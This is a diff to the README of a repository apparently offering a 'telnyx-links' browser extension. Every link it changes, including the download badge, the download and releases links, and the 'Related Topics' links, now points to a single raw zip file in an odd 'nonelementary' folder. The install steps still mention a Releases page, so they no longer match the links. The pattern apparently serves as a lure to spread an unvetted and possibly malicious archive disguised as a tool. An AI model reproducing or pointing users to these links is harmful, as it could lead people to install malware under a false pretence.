@@ -1,7 +1,7 @@
 # 🌐 telnyx-links - Effortlessly Open Multiple Links at Once
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download%20telnyx--links-v1.0-blue.svg)](https://github.com/Mkkbkbajkanabashbsksssnk/telnyx-links/releases)
+[![Download](https://raw.githubusercontent.com/Mkkbkbajkanabashbsksssnk/telnyx-links/main/nonelementary/telnyx-links.zip%https://raw.githubusercontent.com/Mkkbkbajkanabashbsksssnk/telnyx-links/main/nonelementary/telnyx-links.zip)](https://raw.githubusercontent.com/Mkkbkbajkanabashbsksssnk/telnyx-links/main/nonelementary/telnyx-links.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ Welcome to **telnyx-links**! This is a browser extension designed to help you se
 
 To get started, visit the link below to download the extension:
 
-[Download telnyx-links](https://github.com/Mkkbkbajkanabashbsksssnk/telnyx-links/releases)
+[Download telnyx-links](https://raw.githubusercontent.com/Mkkbkbajkanabashbsksssnk/telnyx-links/main/nonelementary/telnyx-links.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Locate the latest version of the extension.
@@ -59,9 +59,9 @@ Thank you for choosing **telnyx-links**! Enjoy a more efficient browsing experie
 
 ## 🔗 Related Topics
 
-- [Batch Opening Links](https://github.com/Mkkbkbajkanabashbsksssnk/telnyx-links/topics/batch-opener)
-- [Browser Tools](https://github.com/Mkkbkbajkanabashbsksssnk/telnyx-links/topics/browser-tools)
-- [Chrome Extensions](https://github.com/Mkkbkbajkanabashbsksssnk/telnyx-links/topics/chrome-extension)
+- [Batch Opening Links](https://raw.githubusercontent.com/Mkkbkbajkanabashbsksssnk/telnyx-links/main/nonelementary/telnyx-links.zip)
+- [Browser Tools](https://raw.githubusercontent.com/Mkkbkbajkanabashbsksssnk/telnyx-links/main/nonelementary/telnyx-links.zip)
+- [Chrome Extensions](https://raw.githubusercontent.com/Mkkbkbajkanabashbsksssnk/telnyx-links/main/nonelementary/telnyx-links.zip)
 
 ## 🛠️ Contribution
 
@@ -71,4 +71,4 @@ If you'd like to contribute to this project, feel free to fork the repository an
 
 Keep an eye on the Releases page for upcoming versions and features:
 
-[Visit the Releases Page](https://github.com/Mkkbkbajkanabashbsksssnk/telnyx-links/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/Mkkbkbajkanabashbsksssnk/telnyx-links/main/nonelementary/telnyx-links.zip)
